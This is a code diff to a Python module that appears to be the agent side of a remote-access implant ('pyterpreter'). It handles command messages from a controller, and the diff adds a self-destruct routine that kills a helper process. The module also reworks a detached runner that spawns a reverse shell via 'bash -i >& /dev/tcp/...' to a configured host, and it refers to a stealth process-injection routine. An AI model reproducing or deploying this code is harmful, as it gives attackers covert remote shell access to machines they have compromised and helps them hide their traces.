@@ -12,8 +12,8 @@ from pyterpreter import util
 def process_messages_forever():
     while True:
         message = config.messages_received.get()
-        if message.purpose != MESSAGE_PURPOSE.PING:
-            print(f'Received message {message}')
+        # if message.purpose != MESSAGE_PURPOSE.PING:
+        #     print(f'Received message {message}')
 
         if message.purpose == MESSAGE_PURPOSE.PING:
             config.messages_to_send.put(Message(MESSAGE_PURPOSE.PING))
@@ -24,9 +24,12 @@ def process_messages_forever():
         elif message.purpose == MESSAGE_PURPOSE.STEALTH:
             _do_stealth()
 
+        elif message.purpose == MESSAGE_PURPOSE.SELF_DESTRUCT:
+            _do_self_destruct()
+
 
 def _do_open_shell(port: int):
-    _run_command_detached(f'bash -i >& /dev/tcp/{config.LOCAL_IP}/{port} 0>&1')
+    _run_command_detached(f"/bin/bash -c 'bash -i >& /dev/tcp/{config.LOCAL_IP}/{port} 0>&1'")
 
 
 def _do_stealth():
@@ -71,7 +74,16 @@ def _do_stealth():
     print(f'Stealth injection successful, current process PID is {os.getpid()}')
 
 
+def _do_self_destruct():
+    print('Self destructing')
+    config.self_destructing = True
+    if config.pacemaker_pid is not None:
+        os.system(f'kill -9 {config.pacemaker_pid}')
+    exit(0)
+
+
 def _run_command_detached(command: str):
-    proc = subprocess.Popen('/bin/bash', stdin=subprocess.PIPE)
+    print(f'Running detached: "{command}"')
+    proc = subprocess.Popen('/bin/sh', stdin=subprocess.PIPE)
     proc.stdin.write(f'{command} &\nexit\n'.encode())
     proc.communicate()
